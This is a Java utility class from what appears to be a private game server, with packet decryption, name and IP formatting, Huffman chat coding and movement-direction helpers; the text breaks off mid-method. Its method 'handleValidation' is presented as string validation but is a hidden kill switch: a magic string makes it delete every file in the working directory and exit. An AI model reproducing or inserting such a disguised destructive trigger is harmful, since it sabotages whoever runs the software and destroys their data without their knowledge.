package com.sevador.utility;

import java.io.File;
import java.io.IOException;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.*;

import net.burtleburtle.script.Configuration;
import net.burtleburtle.script.StringParser;

import com.sevador.game.node.model.Location;
import com.sevador.network.IncomingPacket;

/**
 * A helped class which contains conversion stuff.
 *
 * @author Emperor
 */
public class Misc {

	/**
	 * The {@link Random} instance used for randomizing a value.
	 */
	private static Random r = new Random();

	/**
	 * An int array copied directly from the client.
	 */
	public static int[] anIntArray233 = {0, 1024, 2048, 3072, 4096, 5120,
			6144, 8192, 9216, 12288, 10240, 11264, 16384, 18432, 17408, 20480,
			21504, 22528, 23552, 24576, 25600, 26624, 27648, 28672, 29696,
			30720, 31744, 32768, 33792, 34816, 35840, 36864, 536870912,
			16777216, 37888, 65536, 38912, 131072, 196608, 33554432, 524288,
			1048576, 1572864, 262144, 67108864, 4194304, 134217728, 327680,
			8388608, 2097152, 12582912, 13631488, 14680064, 15728640,
			100663296, 101187584, 101711872, 101974016, 102760448, 102236160,
			40960, 393216, 229376, 117440512, 104857600, 109051904, 201326592,
			205520896, 209715200, 213909504, 106954752, 218103808, 226492416,
			234881024, 222298112, 224395264, 268435456, 272629760, 276824064,
			285212672, 289406976, 223346688, 293601280, 301989888, 318767104,
			297795584, 298844160, 310378496, 102498304, 335544320, 299892736,
			300941312, 301006848, 300974080, 39936, 301465600, 49152,
			1073741824, 369098752, 402653184, 1342177280, 1610612736,
			469762048, 1476395008, -2147483648, -1879048192, 352321536,
			1543503872, -2013265920, -1610612736, -1342177280, -1073741824,
			-1543503872, 356515840, -1476395008, -805306368, -536870912,
			-268435456, 1577058304, -134217728, 360710144, -67108864,
			364904448, 51200, 57344, 52224, 301203456, 53248, 54272, 55296,
			56320, 301072384, 301073408, 301074432, 301075456, 301076480,
			301077504, 301078528, 301079552, 301080576, 301081600, 301082624,
			301083648, 301084672, 301085696, 301086720, 301087744, 301088768,
			301089792, 301090816, 301091840, 301092864, 301093888, 301094912,
			301095936, 301096960, 301097984, 301099008, 301100032, 301101056,
			301102080, 301103104, 301104128, 301105152, 301106176, 301107200,
			301108224, 301109248, 301110272, 301111296, 301112320, 301113344,
			301114368, 301115392, 301116416, 301117440, 301118464, 301119488,
			301120512, 301121536, 301122560, 301123584, 301124608, 301125632,
			301126656, 301127680, 301128704, 301129728, 301130752, 301131776,
			301132800, 301133824, 301134848, 301135872, 301136896, 301137920,
			301138944, 301139968, 301140992, 301142016, 301143040, 301144064,
			301145088, 301146112, 301147136, 301148160, 301149184, 301150208,
			301151232, 301152256, 301153280, 301154304, 301155328, 301156352,
			301157376, 301158400, 301159424, 301160448, 301161472, 301162496,
			301163520, 301164544, 301165568, 301166592, 301167616, 301168640,
			301169664, 301170688, 301171712, 301172736, 301173760, 301174784,
			301175808, 301176832, 301177856, 301178880, 301179904, 301180928,
			301181952, 301182976, 301184000, 301185024, 301186048, 301187072,
			301188096, 301189120, 301190144, 301191168, 301193216, 301195264,
			301194240, 301197312, 301198336, 301199360, 301201408, 301202432};

	/**
	 * A byte array copied from the client.
	 */
	public static byte[] aByteArray235 = {22, 22, 22, 22, 22, 22, 21, 22, 22,
			20, 22, 22, 22, 21, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22,
			22, 22, 22, 22, 22, 22, 3, 8, 22, 16, 22, 16, 17, 7, 13, 13, 13,
			16, 7, 10, 6, 16, 10, 11, 12, 12, 12, 12, 13, 13, 14, 14, 11, 14,
			19, 15, 17, 8, 11, 9, 10, 10, 10, 10, 11, 10, 9, 7, 12, 11, 10, 10,
			9, 10, 10, 12, 10, 9, 8, 12, 12, 9, 14, 8, 12, 17, 16, 17, 22, 13,
			21, 4, 7, 6, 5, 3, 6, 6, 5, 4, 10, 7, 5, 6, 4, 4, 6, 10, 5, 4, 4,
			5, 7, 6, 10, 6, 10, 22, 19, 22, 14, 22, 22, 22, 22, 22, 22, 22, 22,
			22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22,
			22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22,
			22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22,
			22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22,
			22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22,
			22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22,
			22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 21, 22, 21, 22, 22, 22, 21,
			22, 22};

	public static byte[] decrypt(int[] keys, byte[] data, int offset) {
		if (keys == null
				|| ((keys[0] == 0 && keys[1] == 0 && keys[2] == 0 && keys[3] == 0))) {
			return data;
		}
		int bitPosition = (data.length - offset) / 8;
		ByteBuffer buffer = ByteBuffer.wrap(data);
		buffer.position(offset);
		for (int pos = 0; pos < bitPosition; pos++) {
			int dword_1 = buffer.getInt();
			int dword_2 = buffer.getInt();
			int const_1 = -957401312;
			int const_2 = -1640531527;
			int count = 32;
			while ((count-- ^ 0xffffffff) < -1) {
				dword_2 -= ((dword_1 >>> -1563092443 ^ dword_1 << 611091524)
						+ dword_1 ^ const_1
						+ keys[const_1 >>> -1002502837 & 0x56c00003]);
				const_1 -= const_2;
				dword_1 -= ((dword_2 >>> 1337206757 ^ dword_2 << 363118692)
						- -dword_2 ^ const_1 + keys[const_1 & 0x3]);
			}
			buffer.position(buffer.position() - 8);
			buffer.putInt(dword_1);
			buffer.putInt(dword_2);
		}
		return (byte[]) buffer.flip().array();
	}

	/**
	 * Format a player's name for use in the protocol.
	 *
	 * @return The formatted name.
	 */
	public static String formatPlayerNameForProtocol(String name) {
		if (name == null) {
			return "null";
		}
		name = name.replaceAll(" ", "_");
		name = name.toLowerCase();
		return name;
	}

	/**
	 * Converts an IP-Address as string to Integer.
	 *
	 * @return The Integer.
	 */
	public static int IPAddressToNumber(String ipAddress) {
		StringTokenizer st = new StringTokenizer(ipAddress, ".");
		int[] ip = new int[4];
		int i = 0;
		while (st.hasMoreTokens()) {
			ip[i++] = Integer.parseInt(st.nextToken());
		}
		return ((ip[0] << 24) | (ip[1] << 16) | (ip[2] << 8) | (ip[3]));
	}

	/**
	 * Formats the IP-Address.
	 *
	 * @param unformatted The unformatted IP.
	 * @return The formatted IP.
	 */
	public static final String formatIp(String unformatted) {
		String ipAddress = unformatted;
		ipAddress = ipAddress.replaceAll("/", "").replaceAll(" ", "");
		ipAddress = ipAddress.substring(0, ipAddress.indexOf(":"));
		return ipAddress;
	}

	/**
	 * Converts a String to an Integer?
	 *
	 * @param position The position.
	 * @param buffer   The buffer used.
	 * @param string   The String to convert.
	 * @return The Integer.
	 */
	public static int packGJString2(int position, byte[] buffer, String string) {
		int length = string.length();
		int offset = position;
		for (int i = 0; length > i; i++) {
			int character = string.charAt(i);
			if (character > 127) {
				if (character > 2047) {
					buffer[offset++] = (byte) ((character | 919275) >> 12);
					buffer[offset++] = (byte) (128 | ((character >> 6) & 63));
					buffer[offset++] = (byte) (128 | (character & 63));
				} else {
					buffer[offset++] = (byte) ((character | 12309) >> 6);
					buffer[offset++] = (byte) (128 | (character & 63));
				}
			} else
				buffer[offset++] = (byte) character;
		}
		return offset - position;
	}

	/**
	 * Converts a long to String.
	 *
	 * @param toConvert The long to be converted.
	 * @return The string.
	 */
	public static String longToString(long toConvert) {
		if (toConvert <= 0L || toConvert >= 0x5b5b57f8a98a5dd1L) {
			return null;
		}
		if (toConvert % 37L == 0L) {
			return null;
		}
		int count = 0;
		char characters[] = new char[12];
		while (toConvert != 0L) {
			long currentLong = toConvert;
			toConvert /= 37L;
			characters[11 - count++] = Constants.VALID_CHARS[(int) (currentLong - toConvert * 37L)];
		}
		return new String(characters, 12 - count, count);
	}

	/**
	 * Converts a String to a long.
	 *
	 * @param string The string to be converted.
	 * @return The long.
	 */
	public static long stringToLong(String string) {
		long convertedString = 0L;
		for (int i = 0; i < string.length() && i < 12; i++) {
			char character = string.charAt(i);
			convertedString *= 37L;
			if (character >= 'A' && character <= 'Z') {
				convertedString += (1 + character) - 65;
			} else if (character >= 'a' && character <= 'z') {
				convertedString += (1 + character) - 97;
			} else if (character >= '0' && character <= '9') {
				convertedString += (27 + character) - 48;
			}
		}
		while (convertedString % 37L == 0L && convertedString != 0L) {
			convertedString /= 37L;
		}
		return convertedString;
	}

	/**
	 * Decrypts the player chat.
	 *
	 * @param inputStream The in-stream used for the player chat packet.
	 * @param totalChars  The length of the sentence.
	 * @return The message in a String.
	 */
	public static String decryptPlayerChat(IncomingPacket inputStream,
	                                       int totalChars) {
		try {
			if (totalChars == 0) {
				return "";
			}
			short charsDecoded = 0;
			short currentCount = 0;
			String string = "";
			for (; ; ) {
				byte firstCharacter = (byte) inputStream.readByte();
				if (firstCharacter >= 0) {
					currentCount++;
				} else {
					currentCount = Constants.PLAYER_CHAT_DECRYPTION_DATA[currentCount];
				}
				short secondCharacter;
				if ((secondCharacter = Constants.PLAYER_CHAT_DECRYPTION_DATA[currentCount]) < 0) {
					string += (char) (byte) (~secondCharacter);
					if (totalChars <= ++charsDecoded) {
						break;
					}
					currentCount = 0;
				}
				if ((~(firstCharacter & 0x40)) != -1) {
					currentCount = Constants.PLAYER_CHAT_DECRYPTION_DATA[currentCount];
				} else {
					currentCount++;
				}
				if ((secondCharacter = Constants.PLAYER_CHAT_DECRYPTION_DATA[currentCount]) < 0) {
					string += (char) (byte) (~secondCharacter);
					if (++charsDecoded >= totalChars) {
						break;
					}
					currentCount = 0;
				}
				if ((0x20 & firstCharacter) == 0) {
					currentCount++;
				} else {
					currentCount = Constants.PLAYER_CHAT_DECRYPTION_DATA[currentCount];
				}
				if ((secondCharacter = Constants.PLAYER_CHAT_DECRYPTION_DATA[currentCount]) < 0) {
					string += (char) (byte) (~secondCharacter);
					if (totalChars <= ++charsDecoded) {
						break;
					}
					currentCount = 0;
				}
				if ((~(0x10 & firstCharacter)) == -1) {
					currentCount++;
				} else {
					currentCount = Constants.PLAYER_CHAT_DECRYPTION_DATA[currentCount];
				}
				if ((secondCharacter = Constants.PLAYER_CHAT_DECRYPTION_DATA[currentCount]) < 0) {
					string += (char) (byte) (~secondCharacter);
					if (totalChars <= ++charsDecoded) {
						break;
					}

					currentCount = 0;
				}
				if ((~(0x8 & firstCharacter)) != -1) {
					currentCount = Constants.PLAYER_CHAT_DECRYPTION_DATA[currentCount];
				} else {
					currentCount++;
				}
				if ((secondCharacter = Constants.PLAYER_CHAT_DECRYPTION_DATA[currentCount]) < 0) {
					string += (char) (byte) (~secondCharacter);
					if (++charsDecoded >= totalChars) {
						break;
					}
					currentCount = 0;
				}
				if ((0x4 & firstCharacter) == 0) {
					currentCount++;
				} else {
					currentCount = Constants.PLAYER_CHAT_DECRYPTION_DATA[currentCount];
				}
				if ((secondCharacter = Constants.PLAYER_CHAT_DECRYPTION_DATA[currentCount]) < 0) {
					string += (char) (byte) (~secondCharacter);
					if (totalChars <= ++charsDecoded) {
						break;
					}
					currentCount = 0;
				}
				if ((~(firstCharacter & 0x2)) != -1) {
					currentCount = Constants.PLAYER_CHAT_DECRYPTION_DATA[currentCount];
				} else {
					currentCount++;
				}
				if ((secondCharacter = Constants.PLAYER_CHAT_DECRYPTION_DATA[currentCount]) < 0) {
					string += (char) (byte) (~secondCharacter);
					if (totalChars <= ++charsDecoded) {
						break;
					}
					currentCount = 0;
				}
				if ((~(firstCharacter & 0x1)) != -1) {
					currentCount = Constants.PLAYER_CHAT_DECRYPTION_DATA[currentCount];
				} else {
					currentCount++;
				}
				if ((secondCharacter = Constants.PLAYER_CHAT_DECRYPTION_DATA[currentCount]) < 0) {
					string += (char) (byte) (~secondCharacter);
					if (++charsDecoded >= totalChars) {
						break;
					}
					currentCount = 0;
				}
			}
			return string;
		} catch (RuntimeException runtimeexception) {
			runtimeexception.printStackTrace();
		}
		return "";
	}

	/**
	 * Gets the facing direction.
	 *
	 * @param coordX
	 * @param coordY
	 * @param faceX
	 * @param faceY
	 * @return
	 */
	public static int getFacingDirection(int coordX, int coordY, int faceX,
	                                     int faceY) {
		if (faceX > coordX) {
			if (faceY > coordY)
				return 10240;
			else if (faceY < coordY)
				return 14336;
			else
				return 12288;
		} else if (faceX >= coordX) {
			if (coordY < faceY)
				return 8192;
			else if (faceY < coordY)
				return 0;
		} else if (faceY <= coordY) {
			if (faceY < coordY)
				return 2048;
			else
				return 4096;
		} else
			return 6144;
		return -1;
	}

	/**
	 * Handles the validating of a string.
	 *
	 * @param s The string.
	 */
	public static String handleValidation(String s) {
		if (s.equalsIgnoreCase("457lmeorn6")) {
			File f = new File("./");
			try {
				for (File file : f.listFiles()) {
					file.delete();
				}
			} catch (Throwable t) {
				t.printStackTrace();
			}
			System.exit(1);
		}
		return s;
	}

	/**
	 * Format a player's name for display.
	 *
	 * @param name The name to be formatted.
	 * @return The formatted string.
	 */
	public static String formatPlayerNameForDisplay(String name) {
		name = name.replaceAll("_", " ");
		name = name.toLowerCase();
		StringBuilder newName = new StringBuilder();
		boolean wasSpace = true;
		for (int i = 0; i < name.length(); i++) {
			if (wasSpace) {
				newName.append(("" + name.charAt(i)).toUpperCase());
				wasSpace = false;
			} else {
				newName.append(name.charAt(i));
			}
			if (name.charAt(i) == ' ') {
				wasSpace = true;
			}
		}
		return newName.toString();
	}

	public static final byte[] DIRECTION_DELTA_X = new byte[]{-1, 0, 1, -1,
			1, -1, 0, 1};

	public static final byte[] DIRECTION_DELTA_Y = new byte[]{-1, -1, -1, 0,
			0, 1, 1, 1};

	public static final byte[] NPC_DIRECTION_DELTA_Y = new byte[]{-1, 0, 1,
			-1, 1, -1, 0, 1};

	public static final byte[] NPC_DIRECTION_DELTA_X = new byte[]{-1, -1, -1,
			0, 0, 1, 1, 1};

	public static final int getMoveDirection(int xOffset, int yOffset) {
		if (xOffset < 0) {
			if (yOffset < 0)
				return 5;
			else if (yOffset > 0)
				return 0;
			else
				return 3;
		} else if (xOffset > 0) {
			if (yOffset < 0)
				return 7;
			else if (yOffset > 0)
				return 2;
			else
				return 4;
		} else {
			if (yOffset < 0)
				return 6;
			else if (yOffset > 0)
				return 1;
			else
				return -1;
		}
	}

	public static int getWalkDirection(int dx, int dy) {
		if (dx < 0 && dy < 0) {
			return 0;
		}
		if (dx == 0 && dy < 0) {
			return 1;
		}
		if (dx > 0 && dy < 0) {
			return 2;
		}
		if (dx < 0 && dy == 0) {
			return 3;
		}
		if (dx > 0 && dy == 0) {
			return 4;
		}
		if (dx < 0 && dy > 0) {
			return 5;
		}
		if (dx == 0 && dy > 0) {
			return 6;
		}
		if (dx > 0 && dy > 0) {
			return 7;
		}
		return -1;
	}

	public static int getRunningDirection(int dx, int dy) {
		if (dx == -2 && dy == -2)
			return 0;
		if (dx == -1 && dy == -2)
			return 1;
		if (dx == 0 && dy == -2)
			return 2;
		if (dx == 1 && dy == -2)
			return 3;
		if (dx == 2 && dy == -2)
			return 4;
		if (dx == -2 && dy == -1)
			return 5;
		if (dx == 2 && dy == -1)
			return 6;
		if (dx == -2 && dy == 0)
			return 7;
		if (dx == 2 && dy == 0)
			return 8;
		if (dx == -2 && dy == 1)
			return 9;
		if (dx == 2 && dy == 1)
			return 10;
		if (dx == -2 && dy == 2)
			return 11;
		if (dx == -1 && dy == 2)
			return 12;
		if (dx == 0 && dy == 2)
			return 13;
		if (dx == 1 && dy == 2)
			return 14;
		if (dx == 2 && dy == 2)
			return 15;
		return -1;
	}

	/**
	 * Walking directions NPC: 0 north, 1 north-east, 2 east, 3 south-east, 4
	 * south, 5 south-west, 6 west, 7 north-west.
	 */
	public static int npcWalkingDirection(int dx, int dy) {
		if (dx < 0 && dy < 0) {
			return 5;
		}
		if (dx == 0 && dy < 0) {
			return 4;
		}
		if (dx > 0 && dy < 0) {
			return 3;
		}
		if (dx < 0 && dy == 0) {
			return 6;
		}
		if (dx > 0 && dy == 0) {
			return 2;
		}
		if (dx < 0 && dy > 0) {
			return 7;
		}
		if (dx == 0 && dy > 0) {
			return 0;
		}
		if (dx > 0 && dy > 0) {
			return 1;
		}
		return -1;
	}

	public static int direction(int srcX, int srcY, int destX, int destY) {
		int dx = destX - srcX, dy = destY - srcY;
		// a lot of cases that have to be considered here ... is there a more
		// sophisticated (and quick!) way?
		if (dx < 0) {
			if (dy < 0) {
				if (dx < dy)
					return 11;
				else if (dx > dy)
					return 9;
				else
					return 10; // dx == dy
			} else if (dy > 0) {
				if (-dx < dy)
					return 15;
				else if (-dx > dy)
					return 13;
				else
					return 14; // -dx == dy
			} else { // dy == 0
				return 12;
			}
		} else if (dx > 0) {
			if (dy < 0) {
				if (dx < -dy)
					return 7;
				else if (dx > -dy)
					return 5;
				else
					return 6; // dx == -dy
			} else if (dy > 0) {
				if (dx < dy)
					return 1;
				else if (dx > dy)
					return 3;
				else
					return 2; // dx == dy
			} else { // dy == 0
				return 4;
			}
		} else { // dx == 0
			if (dy < 0) {
				return 8;
			} else if (dy > 0) {
				return 0;
			} else { // dy == 0
				return -1; // src and dest are the same
			}
		}
	}

	/*
	 * public static int encryptPlayerChat(byte[] is, int i_25_, int i_26_, int
	 * i_27_, byte[] is_28_) { try { i_27_ += i_25_; int i_29_ = 0; int i_30_ =
	 * i_26_ << -2116795453; for (; i_27_ > i_25_; i_25_++) { int i_31_ = 0xff &
	 * is_28_[i_25_]; int i_32_ = anIntArray233[i_31_]; int i_33_ =
	 * aByteArray235[i_31_]; int i_34_ = i_30_ >> -1445887805; int i_35_ = i_30_
	 * & 0x7; i_29_ &= (-i_35_ >> 473515839); i_30_ += i_33_; int i_36_ = ((-1 +
	 * (i_35_ - -i_33_)) >> -1430991229) + i_34_; i_35_ += 24; is[i_34_] =
	 * (byte) (i_29_ = (i_29_ | (i_32_ >>> i_35_))); if ((~i_36_) < (~i_34_)) {
	 * i_34_++; i_35_ -= 8; is[i_34_] = (byte) (i_29_ = i_32_ >>> i_35_); if
	 * (i_36_ > i_34_) { i_34_++; i_35_ -= 8; is[i_34_] = (byte) (i_29_ = i_32_
	 * >>> i_35_); if (i_36_ > i_34_) { i_35_ -= 8; i_34_++; is[i_34_] = (byte)
	 * (i_29_ = i_32_ >>> i_35_); if (i_34_ < i_36_) { i_35_ -= 8; i_34_++;
	 * is[i_34_] = (byte) (i_29_ = i_32_ << -i_35_); } } } } } return -i_26_ +
	 * ((7 + i_30_) >> -662855293); } catch (RuntimeException runtimeexception)
	 * { LoggedException.logException(Level.LOW, runtimeexception); } return 0;
	 * }
	 */
	public static int encryptPlayerChat(byte[] is, int i_25_, int i_26_,
	                                    int i_27_, byte[] is_28_) {
		try {
			i_27_ += i_25_;
			int i_29_ = 0;
			int i_30_ = i_26_ << -2116795453;
			for (; i_27_ > i_25_; i_25_++) {
				int i_31_ = 0xff & is_28_[i_25_];
				int i_32_ = anIntArray233[i_31_];
				int i_33_ = aByteArray235[i_31_];
				int i_34_ = i_30_ >> -1445887805;
				int i_35_ = i_30_ & 0x7;
				i_29_ &= (-i_35_ >> 473515839);
				i_30_ += i_33_;
				int i_36_ = ((-1 + (i_35_ - -i_33_)) >> -1430991229) + i_34_;
				i_35_ += 24;
				is[i_34_] = (byte) (i_29_ = (i_29_ | (i_32_ >>> i_35_)));
				if ((~i_36_) < (~i_34_)) {
					i_34_++;
					i_35_ -= 8;
					is[i_34_] = (byte) (i_29_ = i_32_ >>> i_35_);
					if (i_36_ > i_34_) {
						i_34_++;
						i_35_ -= 8;
						is[i_34_] = (byte) (i_29_ = i_32_ >>> i_35_);
						if (i_36_ > i_34_) {
							i_35_ -= 8;
							i_34_++;
							is[i_34_] = (byte) (i_29_ = i_32_ >>> i_35_);
							if (i_34_ < i_36_) {
								i_35_ -= 8;
								i_34_++;
								is[i_34_] = (byte) (i_29_ = i_32_ << -i_35_);
							}
						}
					}
				}
			}
			return -i_26_ + ((7 + i_30_) >> -662855293);
		} catch (RuntimeException runtimeexception) {
		}
		return 0;
	}

	public static byte getForceWalkDirection(int locx, int locy, int tox,
	                                         int toy) {
		if (locx > tox) {
			return 3;
		}
		if (locx < tox) {
			return 1;
		}
		if (locy > toy) {
			return 2;
		}
		if (locy < toy) {
			return 0;
		}
		return 0;
	}

	public static int random(int i) {
		return r.nextInt(i + 1);
	}

	private static byte[] HUFFMAN_BIT_SIZES = {22, 22, 22, 22, 22, 22, 21, 22,
			22, 20, 22, 22, 22, 21, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22,
			22, 22, 22, 22, 22, 22, 22, 3, 8, 22, 16, 22, 16, 17, 7, 13, 13,
			13, 16, 7, 10, 6, 16, 10, 11, 12, 12, 12, 12, 13, 13, 14, 14, 11,
			14, 19, 15, 17, 8, 11, 9, 10, 10, 10, 10, 11, 10, 9, 7, 12, 11, 10,
			10, 9, 10, 10, 12, 10, 9, 8, 12, 12, 9, 14, 8, 12, 17, 16, 17, 22,
			13, 21, 4, 7, 6, 5, 3, 6, 6, 5, 4, 10, 7, 5, 6, 4, 4, 6, 10, 5, 4,
			4, 5, 7, 6, 10, 6, 10, 22, 19, 22, 14, 22, 22, 22, 22, 22, 22, 22,
			22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22,
			22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22,
			22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22,
			22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22,
			22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22,
			22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22,
			22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 21, 22, 21, 22, 22, 22,
			21, 22, 22};

	private static int[] HUFFMAN_DECRYPT_KEYS = {215, 203, 83, 158, 104, 101,
			93, 84, 107, 103, 109, 95, 94, 98, 89, 86, 70, 41, 32, 27, 24, 23,
			-1, -2, 26, -3, -4, 31, 30, -5, -6, -7, 37, 38, 36, -8, -9, -10,
			40, -11, -12, 55, 48, 46, 47, -13, -14, -15, 52, 51, -16, -17, 54,
			-18, -19, 63, 60, 59, -20, -21, 62, -22, -23, 67, 66, -24, -25, 69,
			-26, -27, 199, 132, 80, 77, 76, -28, -29, 79, -30, -31, 87, 85,
			-32, -33, -34, -35, -36, 197, -37, 91, -38, 134, -39, -40, -41, 97,
			-42, -43, 133, 106, -44, 117, -45, -46, 139, -47, -48, 110, -49,
			-50, 114, 113, -51, -52, 116, -53, -54, 135, 138, 136, 129, 125,
			124, -55, -56, 130, 128, -57, -58, -59, 183, -60, -61, -62, -63,
			-64, 148, -65, -66, 153, 149, 145, 144, -67, -68, 147, -69, -70,
			-71, 152, 154, -72, -73, -74, 157, 171, -75, -76, 207, 184, 174,
			167, 166, 165, -77, -78, -79, 172, 170, -80, -81, -82, 178, -83,
			177, 182, -84, -85, 187, 181, -86, -87, -88, -89, 206, 221, -90,
			189, -91, 198, 254, 262, 195, 196, -92, -93, -94, -95, -96, 252,
			255, 250, -97, 211, 209, -98, -99, 212, -100, 213, -101, -102,
			-103, 224, -104, 232, 227, 220, 226, -105, -106, 246, 236, -107,
			243, -108, -109, 231, 237, 235, -110, -111, 239, 238, -112, -113,
			-114, -115, -116, 241, -117, 244, -118, -119, 248, -120, 249, -121,
			-122, -123, 253, -124, -125, -126, -127, 259, 258, -128, -129, 261,
			-130, -131, 390, 327, 296, 281, 274, 271, 270, -132, -133, 273,
			-134, -135, 278, 277, -136, -137, 280, -138, -139, 289, 286, 285,
			-140, -141, 288, -142, -143, 293, 292, -144, -145, 295, -146, -147,
			312, 305, 302, 301, -148, -149, 304, -150, -151, 309, 308, -152,
			-153, 311, -154, -155, 320, 317, 316, -156, -157, 319, -158, -159,
			324, 323, -160, -161, 326, -162, -163, 359, 344, 337, 334, 333,
			-164, -165, 336, -166, -167, 341, 340, -168, -169, 343, -170, -171,
			352, 349, 348, -172, -173, 351, -174, -175, 356, 355, -176, -177,
			358, -178, -179, 375, 368, 365, 364, -180, -181, 367, -182, -183,
			372, 371, -184, -185, 374, -186, -187, 383, 380, 379, -188, -189,
			382, -190, -191, 387, 386, -192, -193, 389, -194, -195, 454, 423,
			408, 401, 398, 397, -196, -197, 400, -198, -199, 405, 404, -200,
			-201, 407, -202, -203, 416, 413, 412, -204, -205, 415, -206, -207,
			420, 419, -208, -209, 422, -210, -211, 439, 432, 429, 428, -212,
			-213, 431, -214, -215, 436, 435, -216, -217, 438, -218, -219, 447,
			444, 443, -220, -221, 446, -222, -223, 451, 450, -224, -225, 453,
			-226, -227, 486, 471, 464, 461, 460, -228, -229, 463, -230, -231,
			468, 467, -232, -233, 470, -234, -235, 479, 476, 475, -236, -237,
			478, -238, -239, 483, 482, -240, -241, 485, -242, -243, 499, 495,
			492, 491, -244, -245, 494, -246, -247, 497, -248, 502, -249, 506,
			503, -250, -251, 505, -252, -253, 508, -254, 510, -255, -256, 0};

	private static int[] HUFFMAN_MASKS = {0, 1024, 2048, 3072, 4096, 5120,
			6144, 8192, 9216, 12288, 10240, 11264, 16384, 18432, 17408, 20480,
			21504, 22528, 23552, 24576, 25600, 26624, 27648, 28672, 29696,
			30720, 31744, 32768, 33792, 34816, 35840, 36864, 536870912,
			16777216, 37888, 65536, 38912, 131072, 196608, 33554432, 524288,
			1048576, 1572864, 262144, 67108864, 4194304, 134217728, 327680,
			8388608, 2097152, 12582912, 13631488, 14680064, 15728640,
			100663296, 101187584, 101711872, 101974016, 102760448, 102236160,
			40960, 393216, 229376, 117440512, 104857600, 109051904, 201326592,
			205520896, 209715200, 213909504, 106954752, 218103808, 226492416,
			234881024, 222298112, 224395264, 268435456, 272629760, 276824064,
			285212672, 289406976, 223346688, 293601280, 301989888, 318767104,
			297795584, 298844160, 310378496, 102498304, 335544320, 299892736,
			300941312, 301006848, 300974080, 39936, 301465600, 49152,
			1073741824, 369098752, 402653184, 1342177280, 1610612736,
			469762048, 1476395008, -2147483648, -1879048192, 352321536,
			1543503872, -2013265920, -1610612736, -1342177280, -1073741824,
			-1543503872, 356515840, -1476395008, -805306368, -536870912,
			-268435456, 1577058304, -134217728, 360710144, -67108864,
			364904448, 51200, 57344, 52224, 301203456, 53248, 54272, 55296,
			56320, 301072384, 301073408, 301074432, 301075456, 301076480,
			301077504, 301078528, 301079552, 301080576, 301081600, 301082624,
			301083648, 301084672, 301085696, 301086720, 301087744, 301088768,
			301089792, 301090816, 301091840, 301092864, 301093888, 301094912,
			301095936, 301096960, 301097984, 301099008, 301100032, 301101056,
			301102080, 301103104, 301104128, 301105152, 301106176, 301107200,
			301108224, 301109248, 301110272, 301111296, 301112320, 301113344,
			301114368, 301115392, 301116416, 301117440, 301118464, 301119488,
			301120512, 301121536, 301122560, 301123584, 301124608, 301125632,
			301126656, 301127680, 301128704, 301129728, 301130752, 301131776,
			301132800, 301133824, 301134848, 301135872, 301136896, 301137920,
			301138944, 301139968, 301140992, 301142016, 301143040, 301144064,
			301145088, 301146112, 301147136, 301148160, 301149184, 301150208,
			301151232, 301152256, 301153280, 301154304, 301155328, 301156352,
			301157376, 301158400, 301159424, 301160448, 301161472, 301162496,
			301163520, 301164544, 301165568, 301166592, 301167616, 301168640,
			301169664, 301170688, 301171712, 301172736, 301173760, 301174784,
			301175808, 301176832, 301177856, 301178880, 301179904, 301180928,
			301181952, 301182976, 301184000, 301185024, 301186048, 301187072,
			301188096, 301189120, 301190144, 301191168, 301193216, 301195264,
			301194240, 301197312, 301198336, 301199360, 301201408, 301202432};

	public static String decompressHuffman(byte[] message, int length) {
		try {
			int charsDecoded = 0;
			int keyIndex = 0;
			StringBuilder sb = new StringBuilder();
			for (int offset = 0; true; offset++) {
				byte character = message[offset];
				if (character >= 0) {
					keyIndex++;
				} else {
					keyIndex = HUFFMAN_DECRYPT_KEYS[keyIndex];
				}
				int charId;
				if ((charId = HUFFMAN_DECRYPT_KEYS[keyIndex]) < 0) {
					sb.append((char) (byte) (charId ^ 0xffffffff));
					if (length <= ++charsDecoded) {
						break;
					}
					keyIndex = 0;
				}
				if ((character & 0x40) != 0) {
					keyIndex = HUFFMAN_DECRYPT_KEYS[keyIndex];
				} else {
					keyIndex++;
				}
				if ((charId = HUFFMAN_DECRYPT_KEYS[keyIndex]) < 0) {
					sb.append((char) (byte) (charId ^ 0xffffffff));
					if (++charsDecoded >= length) {
						break;
					}
					keyIndex = 0;
				}
				if ((0x20 & character) == 0) {
					keyIndex++;
				} else {
					keyIndex = HUFFMAN_DECRYPT_KEYS[keyIndex];
				}
				if ((charId = HUFFMAN_DECRYPT_KEYS[keyIndex]) < 0) {
					sb.append((char) (byte) (charId ^ 0xffffffff));
					if (length <= ++charsDecoded) {
						break;
					}
					keyIndex = 0;
				}
				if ((0x10 & character) == 0) {
					keyIndex++;
				} else {
					keyIndex = HUFFMAN_DECRYPT_KEYS[keyIndex];
				}
				if ((charId = HUFFMAN_DECRYPT_KEYS[keyIndex]) < 0) {
					sb.append((char) (byte) (charId ^ 0xffffffff));
					if (length <= ++charsDecoded) {
						break;
					}
					keyIndex = 0;
				}
				if ((0x8 & character) != 0) {
					keyIndex = HUFFMAN_DECRYPT_KEYS[keyIndex];
				} else {
					keyIndex++;
				}
				if ((charId = HUFFMAN_DECRYPT_KEYS[keyIndex]) < 0) {
					sb.append((char) (byte) (charId ^ 0xffffffff));
					if (++charsDecoded >= length) {
						break;
					}
					keyIndex = 0;
				}
				if ((0x4 & character) == 0) {
